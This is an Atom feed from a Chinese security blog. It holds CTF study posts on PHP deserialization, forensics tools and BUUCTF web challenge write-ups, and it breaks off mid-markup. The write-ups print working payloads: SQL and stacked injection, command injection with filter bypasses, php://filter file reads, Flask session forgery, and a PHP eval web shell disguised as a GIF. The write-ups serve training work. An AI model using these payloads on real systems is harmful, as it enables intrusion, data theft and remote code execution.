<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大白</title>
  
  
  <link href="https://dabai5269.top/atom.xml" rel="self"/>
  
  <link href="https://dabai5269.top/"/>
  <updated>2023-05-12T07:19:55.067Z</updated>
  <id>https://dabai5269.top/</id>
  
  <author>
    <name>大白</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP之preg_match绕过</title>
    <link href="https://dabai5269.top/post/6c198c6.html"/>
    <id>https://dabai5269.top/post/6c198c6.html</id>
    <published>2023-05-12T07:19:06.000Z</published>
    <updated>2023-05-12T07:19:55.067Z</updated>
    
    
    <summary type="html">正则匹配绕过</summary>
    
    
    
    
    <category term="PHP" scheme="https://dabai5269.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://dabai5269.top/post/8ac6c1a1.html"/>
    <id>https://dabai5269.top/post/8ac6c1a1.html</id>
    <published>2023-05-12T05:01:35.000Z</published>
    <updated>2023-05-16T11:37:55.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化就是将 对象object、字符串string、数组array、变量 转换成具有一定格式的字符串，方便保持稳定的格式在文件中传输，以便还原为原来的内容。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&quot;aa&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:7:&quot;%00Flag%00a&quot;;s:2:&quot;aa&quot;;s:4:&quot;%00*%00b&quot;;s:2:&quot;bb&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这里面O代表对象；4代表对象名长度；Flag是对象名；3是对象里面的成员变量的数量；同时注意到类里面的方法并不会序列化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同，`%00` 虽然不会显示，但是提交还是要加上去。</span><br><span class="line"></span><br><span class="line">public : 被序列化的时候属性名 不会更改</span><br><span class="line"></span><br><span class="line">protected : 被序列化的时候属性名 会变成 %00*%00属性名</span><br><span class="line"></span><br><span class="line">private : 被序列化的时候属性名 会变成 %00类名%00属性名</span><br><span class="line"></span><br><span class="line">输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化就是序列化的逆过程。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&quot;aa&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$c1</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c1</span>;</span><br><span class="line"><span class="variable">$c2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$c1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:7:&quot; Flag a&quot;;s:2:&quot;aa&quot;;s:4:&quot; * b&quot;;s:2:&quot;bb&quot;;&#125;object(Flag)#2 (3) &#123;</span><br><span class="line">  [&quot;file&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;a&quot;:&quot;Flag&quot;:private]=&gt;</span><br><span class="line">  string(2) &quot;aa&quot;</span><br><span class="line">  [&quot;b&quot;:protected]=&gt;</span><br><span class="line">  string(2) &quot;bb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>反序列化漏洞里会有一些魔术方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">PHP反序列化</summary>
    
    
    
    
    <category term="PHP" scheme="https://dabai5269.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Misc常用工具</title>
    <link href="https://dabai5269.top/post/d17189cf.html"/>
    <id>https://dabai5269.top/post/d17189cf.html</id>
    <published>2023-04-29T08:26:24.000Z</published>
    <updated>2023-04-29T09:17:07.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-File-命令"><a href="#1-File-命令" class="headerlink" title="1.File 命令"></a>1.File 命令</h3><p> 当一个文件没有后缀的时候而无法正常打开时，<br> 在Linux中可以使用： file 文件名 此命令来识别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file filename</span><br><span class="line">strings filename //查看文件里的字符串</span><br></pre></td></tr></table></figure><h3 id="2-常见文件头类型"><a href="#2-常见文件头类型" class="headerlink" title="2.常见文件头类型"></a>2.常见文件头类型</h3><p><img src="https://nimg.ws.126.net/?url=https://crawl.ws.126.net/img/743f13caf1846ac759ad0770a83063ea.jpg&thumbnail=650x2147483647&quality=80&type=jpg" alt="img"></p><h3 id="3-文件分离操作"><a href="#3-文件分离操作" class="headerlink" title="3.文件分离操作"></a>3.文件分离操作</h3><p>1.binwalk</p><p>windows下的命令，linux下去掉python</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python binwalk filename   //查看文件的信息</span><br><span class="line">python binwalk -e filename  //分离文件</span><br></pre></td></tr></table></figure><p>2.foremost</p><p>如果binwalk无法正确分离出文件，可以使用foremost，使用kali</p><p>用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foremost 文件名 -o 输出目录名</span><br></pre></td></tr></table></figure><p>3.010Editor</p><p>将某块区域文件保存的方式如下:</p><p>右键选择部分</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230429164251928.png" alt="image-20230429164251928"></p><p>其他用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl+shift+c  //复制左边的16进制文本</span><br><span class="line">ctrl+shift+v  //粘贴进来16进制文本 </span><br></pre></td></tr></table></figure><h3 id="4-图片音频工具"><a href="#4-图片音频工具" class="headerlink" title="4.图片音频工具"></a>4.图片音频工具</h3><p>1.Stegsolve</p><p>可以查看图片里面是否还隐藏的图片，将gif分帧进行查看，lsb隐写查看等</p><p>2.zsteg</p><p>检测LSB隐写，检测PNG和BMP图片中的隐写数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zsteg xxx.png</span><br></pre></td></tr></table></figure><p>3.Audacity：用于音频隐写</p><p>4.Jphide（jpg图片）</p><p>打开jphswin.exe， 使用open jpeg打开图片，点击seek,输入密码和确认密码，在弹出文件框中选择要保存的解密文件位置即可，结果保存成txt文件</p><p>5.二维码处理</p><p>CQR.exe可以扫瞄二维码的信息，如果二维码某个定位角被覆盖了，该工具有时候也可以自动识别</p><p>6.MP3Stego</p><p>处理mp3的隐写一般使用mp3Stego,但是处理时需要密码</p><p>使用decode解密（将需要解密的MP3文件复制至装有decode文件的目录下）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P 密码 MP3文件名</span><br></pre></td></tr></table></figure><p>（-X 获取隐藏文件 -P密码）</p><p>7.steghide</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分离：steghide extract -sf test.jpg -p 123456</span><br><span class="line">-p 密码参数，后面空格跟密码，无密码可不加参数，回车就好</span><br><span class="line">查看：steghide info</span><br></pre></td></tr></table></figure><p>8.TweakPNG</p><p>PNG图形浏览工具，当文件头正常但无法打开，可能是CRC校验错误，可以尝试通过TweakPNG打开</p><p>9.silentEye<br> silenteye是一款可以将文字或者文件隐藏到图片的解密工具</p><h3 id="5-压缩包工具"><a href="#5-压缩包工具" class="headerlink" title="5.压缩包工具"></a>5.压缩包工具</h3><p>1.ZIperello：暴力破解压缩包密码</p><p>2.ARchive：更强大的暴力破解工具</p><p>3.伪加密 ZipCenOp.jar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ZipCenOp.jar r xx.zip</span><br></pre></td></tr></table></figure><p>就知道这些</p>]]></content>
    
    
    <summary type="html">misc</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-web</title>
    <link href="https://dabai5269.top/post/5473bd.html"/>
    <id>https://dabai5269.top/post/5473bd.html</id>
    <published>2023-04-12T10:53:31.000Z</published>
    <updated>2023-04-20T13:02:37.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 万能公式</span><br><span class="line">1 and 1=1</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1 or 1=1 </span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用万能密码登录<strong>1’ or  ‘1’&#x3D;’1</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412190347772.png" alt="image-20230412190347772"></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看网页源代码，get方式传入cat&#x3D;dog即可</p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>查看源代码，得到提示</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191003372.png" alt="image-20230412191003372"></p><p>对源码进行解析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            //条件一：page的值为空或者不是字符串，那么不通过</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">//条件二：page的值在白名单中，则通过</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)//查找字符串在另一个字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            //条件三：page中?之前的值在白名单中，则通过</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">//将url编码后的字符串还原成未编码的样子，然后赋值给page</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            //返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)//查找字符串在另一个字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            //条件四：page还原成未编码之后，?前面的值是否在白名单内，是则通过</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//以上条件满足一个则结果包含file</span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">//这一坨代码，告诉我们，你输入的payload不为空，是字符串，且前面那个函数返回是ture，</span><br><span class="line">//才能给你include包含文件。这也是为什么我们file=后面要先接一个hint.php或者resource.php</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>从hint.php开始，..&#x2F;五个，读取文件</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191836788.png" alt="image-20230412191836788"></p><p>题外话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这和linux系统是一样的， </span><br><span class="line"></span><br><span class="line">. 表示当前目录</span><br><span class="line">.. 表示当前目录的上一级目录。</span><br><span class="line">./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定</span><br><span class="line">../表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">文件夹 a</span><br><span class="line">下面有  文件夹b c 和文件 d。</span><br><span class="line">文件夹b下面有e.php 和文件f。</span><br><span class="line"></span><br><span class="line">则e中的 . 表示 文件夹b</span><br><span class="line">./f 表示b下面的文件f。</span><br><span class="line">..  表示a文件夹。</span><br><span class="line">../d 表示a文件夹下的d文件。</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目提示包含漏洞</p><p>利用PHP封装协议：<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412192213420.png" alt="image-20230412192213420"></p><p>得到base64解码得到flag</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>常见管道符直接执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. | （按位或），直接执行|后面的语句</span><br><span class="line">2. || （逻辑或），如果||前面的语句是错误的，则执行后面的语句，否则的话只执行前面的语句</span><br><span class="line">3. &amp; （按位与），无论&amp;前后的语句真假，都要执行</span><br><span class="line">4. &amp;&amp; （逻辑与），若前面的语句为假，则后面的语句也不执行；若前面的语句为真则执行前后两条语句</span><br><span class="line">5. ; (作用和&amp;一样)</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193305228.png" alt="image-20230412193305228"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1和2都回显正常</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure><p>出现报错</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193723936.png" alt="image-20230412193723936"></p><p>说明字段有两位，尝试联合注入查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union seclet 1,2#</span><br></pre></td></tr></table></figure><p>不行，过滤了<strong>select|update|delete|drop|insert|where|.&#x2F;i</strong></p><p>我们尝试堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases; #</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194247241.png" alt="image-20230412194247241"></p><p>爆表名<strong>1’; show tables;#</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194440570.png" alt="image-20230412194440570"></p><p>查表的字段<strong>1’;show columns from words;#</strong></p><p><strong>1’; show columns from <code>1919810931114514</code>;#</strong><br><strong>注意：表名为数字时，要用&#96;包起来查询。</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194738125.png" alt="image-20230412194738125"></p><p>flag 找到了，该怎么查看数据呢</p><p>方法一：改名换姓</p><p>我们可以“改名换姓”把1919810931114514表名改成words表，仅如此还不够，由于words表有两个字段，我们需要把新的words表也变成两个字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table &#x27;1919810931114514&#x27; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p>方法二：关键字编码绕过</p><p>select被过滤了，那么我们可以绕过这个过滤（16进制编码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x&lt;这里填查询语句的十六进制代码&gt;;prepare execsql from @a;execute execsql;#</span><br><span class="line">也就是：</span><br><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure><p>方法三：关键字过滤之等价函数替换</p><p>查询语句除了我们常用的“SELECT”语句以外还有HANDLER。并且在官方的说明中“HANDLER查询性能比SELECT更好”所以我们可以直接换个查询函数赛。（我不李姐）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as flag; handler flag read next;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195335176.png" alt="image-20230412195335176"></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>题目提示ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195655093.png" alt="image-20230412195655093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195808644.png" alt="image-20230412195808644"></p><p>提示过滤了空格（f*uk）</p><p>空格绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125;替换</span><br><span class="line">$IFS$1替换</span><br><span class="line">$&#123;IFS替换</span><br><span class="line">%20替换</span><br><span class="line">&lt;和&lt;&gt;重定向符替换</span><br><span class="line">%09替换</span><br></pre></td></tr></table></figure><p>查看一下源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200159641.png" alt="image-20230412200159641"></p><p>这里 匹配一个字符串中，是否按顺序出现过flag四个字母。所以不能有flag。那我们进行绕过</p><p>变量绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>然后查看网页源代码得到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200708343.png" alt="image-20230412200708343"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>打开题目，查看源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419201617706.png" alt="image-20230419201617706"></p><p>提示我不是admin</p><p>尝试注册admin,提示已被注册</p><p>先随便注册一个账号进去看看，</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419201848848.png" alt="image-20230419201848848"></p><p>在<strong>修改密码页面</strong>，查看源代码，发现github上的源码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419202007017.png" alt="image-20230419202007017"></p><p>可惜404了</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419202037199.png" alt="image-20230419202037199"></p><p>找别人博客看吧</p><p>姿势一：弱口令爆破一波,因为是个弱口令(123),爆破也能爆破出来，<strong>admin,123</strong>得到flag</p><p>弱口令不行的话就试试<strong>sql注入</strong>,抓包看看，有一个session</p><p>姿势二：</p><p>session伪造（flask）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session 和 Cookie 功能效果是差不多的，区别就是session 是记录在服务端的，Cookie是记录在客户端的</span><br><span class="line">但flask的session保存在客户端，我们需要找到密钥来对session进行解码来获取其中的用户数据</span><br></pre></td></tr></table></figure><p>找到session</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419203729050.png" alt="image-20230419203729050"></p><p>再找一个来处理session的脚本</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>简单用法：</p><p>decode -c “session”</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419203908894.png" alt="image-20230419203908894"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;YjEwZjBiZmQ4Mjg3MjE5M2MyYjFjNTU4MDQ1ZWQyM2UyOTk2NTdkOGVmMmRiMDM1MGVlMmQwNzA4Y2Y5YTI2MjI5ZTAzOWQyZDU4MDVhMDIzN2I1Nzg2ZTQ3OWZiMWRlNTAzYjE4YmU3NzMyM2VlMmI3Y2RiM2Q1ZGEwOGIwN2Y=&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;MDhmM2VhZmMxY2RhZDNhNGQzZGE5ZTJlNzk2ODIwODcxYmU1M2YwYg==&quot;&#125;,&quot;image&quot;:&#123;&quot; b&quot;:&quot;NW94Sw==&quot;&#125;,&quot;name&quot;:&quot;1&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;</span><br></pre></td></tr></table></figure><p>将用户名name改为admin</p><p>加密时一直报错</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204301393.png" alt="image-20230419204301393"></p><p>找了一个decode脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204440482.png" alt="image-20230419204440482"></p><p>发现这个用的是单引号那个是双引号<br> 同时这个把base64直接解码了</p><p>再进行encode</p><p>用法：encode -s “钥匙” -t “明文”</p><p>钥匙在源码找到的</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204726351.png" alt="image-20230419204726351"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204645536.png" alt="image-20230419204645536"></p><p>修改session的值，刷新就行</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204835926.png" alt="image-20230419204835926"></p><p>姿势三：Unicode欺骗</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419205242000.png" alt="image-20230419205242000"></p><p>发现注册和登录以及修改密码处只是对数据进行了<strong>strlower()函数</strong>小写化，在末尾查看函数</p><p><strong>strlower()函数</strong>的作用是小写化name</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419205333918.png" alt="image-20230419205333918"></p><p><strong>nodeprep.prepare</strong>这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A，而A在调用一次nodeprep.prepare函数会把A转换成a</p><p>这个字符可以在后面网站找到，<a href="https://unicode-table.com/en/1D2E/">https://unicode-table.com/en/1D2E/</a></p><p>1.如果用ᴬᴰᴹᴵᴺ注册，注册经过处理，储存在数据库就变成了 ADMIN</p><p>2.登录后，加密储存在session 的也是ADMIN</p><p>3.修改密码后，取出session进行解密name也是ADMIN</p><p>4.再调用一次strlower函数就变成了admin</p><p>5.这时admin 的密码就变成了自定义修改后的密码。登录后就得到 flag 。</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一句话木马。并且将下面的内容保存成文件2.png</p><p>内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接上传成功了<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420141955359.png" alt="image-20230420141955359"></p><p>用蚁剑还是连不上</p><p><strong>.htaccess是什么</strong></p><p>启用.htaccess需要修改httpd.conf（Apache里的）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 